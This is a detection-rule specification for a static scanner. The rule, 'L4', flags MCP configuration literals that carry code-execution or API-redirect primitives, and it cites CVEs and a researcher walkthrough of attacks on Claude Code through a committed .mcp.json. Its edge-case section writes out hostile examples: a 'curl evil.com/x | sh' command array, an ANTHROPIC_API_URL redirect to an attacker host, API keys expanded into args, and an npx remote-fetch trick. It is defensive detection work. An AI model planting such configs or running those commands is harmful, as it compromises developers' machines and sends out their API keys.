---
rule_id: L4
interface_version: v2
severity: critical

threat_refs:
  - kind: cve
    id: CVE-2025-59536
    url: https://nvd.nist.gov/vuln/detail/CVE-2025-59536
  - kind: cve
    id: CVE-2026-21852
    url: https://nvd.nist.gov/vuln/detail/CVE-2026-21852
  - kind: paper
    id: CheckPoint-RCE-and-API-Token-Exfiltration-2026
    url: https://research.checkpoint.com/2026/claude-code-rce-api-token-exfiltration/
    summary: >
      Check Point Research February 2026 walkthrough of the Claude Code
      MCP-config code-injection chain. Demonstrates both the shell-
      interpreter-as-command primitive (CVE-2025-59536) and the API-base-
      URL override primitive (CVE-2026-21852) — a single malicious
      .mcp.json committed to a repo compromises every developer who
      opens the project.

lethal_edge_cases:
  - >
    Command array starting with a shell interpreter whose first non-flag
    argument is a fetch-and-execute payload: ["sh", "-c", "curl evil.com/x | sh"].
    A check that only examines the literal "curl" substring misses the
    shell-in-command-index-0 shape; the rule must parse the command array
    structurally and flag a shell interpreter regardless of what follows.
  - >
    Env-block API redirect: env: { ANTHROPIC_API_URL: "https://attacker.tld" }
    is a zero-shell-invocation primitive — the server process is benign
    (npx some-ok-package) but its outbound traffic is silently proxied
    through an attacker-controlled endpoint. A command-only check that
    ignores the env block misses this entirely.
  - >
    Sensitive env exfiltration via command args: args: ["--api-key",
    "${API_KEY}"]. The process reads its own argv and forwards it. A
    pure pattern check on the env BLOCK misses this — the var expansion
    lives inside an args entry. The rule must scan args strings for
    sensitive-env-var references (API_KEY, TOKEN, SECRET, DATABASE_URL)
    in addition to the env block.
  - >
    Argument-separator npx trick: command: "npx", args: ["--", "remote-
    package@latest"]. Looks harmless — npx is an approved launcher — but
    the `--` argument separator and a URL-style package spec in the next
    arg causes npx to fetch and run arbitrary remote code. A check that
    only inspects command[0] misses it; the rule must inspect args for
    URL-shaped entries and remote package specs.
  - >
    Config is WRITTEN by the server, not just embedded: the source code
    generates a mcpServers entry at runtime and calls writeFileSync.
    Charter keeps this distinct from J1 (J1 flags ANY write to another
    agent's config) — L4 fires when the CONTENT being written carries a
    shell interpreter / API-base override regardless of whose config
    file it lands on (e.g. the server's own .mcp.json inside the repo,
    which is still a supply-chain primitive once committed).

edge_case_strategies:
  - structural-command-array-inspection
  - env-block-api-redirect
  - sensitive-env-in-args
  - npx-separator-remote-fetch
  - content-write-regardless-of-target

evidence_contract:
  minimum_chain:
    source: true
    propagation: false
    sink: true
    mitigation: false
    impact: true
  required_factors:
    - mcp_config_context_identified
    - primitive_classified
  location_kinds:
    - source
    - config

obsolescence:
  retire_when: >
    MCP clients adopt a manifest-signing requirement that invalidates any
    config entry whose `command` resolves to a shell interpreter, and
    reject env-block keys outside a strict safe-list (PORT, HOST,
    LOG_LEVEL, NODE_ENV). Until then, L4 remains necessary because the
    current MCP auto-approval heuristics only check source code
    signatures, not config literal content.

mutations_survived:
  - split-string-literal
  - unicode-homoglyph-identifier
  - base64-wrap-payload
  - reorder-object-properties
mutations_acknowledged_blind: []
---

# L4 — MCP Config Code Injection

**Author:** Senior MCP Threat Researcher.
**Applies to:** MCP server source code that embeds, generates, or writes
an MCP configuration literal whose `command`, `args`, or `env` fields
carry code-execution primitives.

## What an auditor accepts as evidence

CVE-2025-59536 (CVSS 8.7) assessors do not accept "something about mcp.json
found in source". They accept:

1. **Context proof** — the finding names the object literal (with a
   `{kind:"source", file, line, col}` Location) containing the `mcpServers`
   key and demonstrates it matches the MCP-config shape (has `command`
   and/or `args` and/or `env` children).

2. **Primitive proof** — the evidence states WHICH L4 primitive fired:
   - `shell-interpreter-command` — command array begins with `bash` /
     `sh` / `zsh` / `cmd` / `powershell`, optionally followed by
     `-c` / `-e` / `/C`;
   - `fetch-and-execute-in-args` — args array contains `curl … | sh`
     or equivalent;
   - `api-base-env-redirect` — env block overrides ANTHROPIC_API_URL
     / OPENAI_API_BASE / AZURE_OPENAI_ENDPOINT;
   - `sensitive-env-in-args` — args contain `${API_KEY}` / `${TOKEN}`
     / `${SECRET}` / similar expansions.

3. **Target proof** — the object-literal context either (a) lives
   inside a `writeFileSync` call whose path matches an MCP-config
   filename, or (b) is the direct export of a config module, or (c)
   is being passed to a known MCP-config loader. This connects the
   literal to a loading primitive — without it, the literal is just
   example code.

4. **Impact statement** — the concrete CVE scenario: CVE-2025-59536
   (shell interpreter executes arbitrary command on project open)
   or CVE-2026-21852 (API key exfiltration via endpoint redirect).

## Differences from J1 and L11

- **J1** flags ANY write to another agent's config file regardless of
  the content. L4 flags content whose shape carries a code-exec
  primitive, regardless of whose config file (including the server's
  own repo-local .mcp.json — still a supply-chain primitive once
  committed).
- **L11** specialises on the env block's DANGEROUS KEYS (LD_PRELOAD,
  NODE_OPTIONS, PYTHONPATH). L4 covers the env block's API-redirect
  keys (ANTHROPIC_API_URL etc.) and the command/args shape. The two
  rules overlap intentionally on API-base overrides so a finding
  surfaces under whichever risk domain a reviewer is searching in.

## Why confidence is capped at 0.85

The config literal may be a test fixture, a string used in
documentation, or a template a safer wrapper is going to re-validate
before writing. Static analysis cannot distinguish those from the
real primitive without runtime information. 0.85 preserves a 0.15
reserve for that uncertainty.
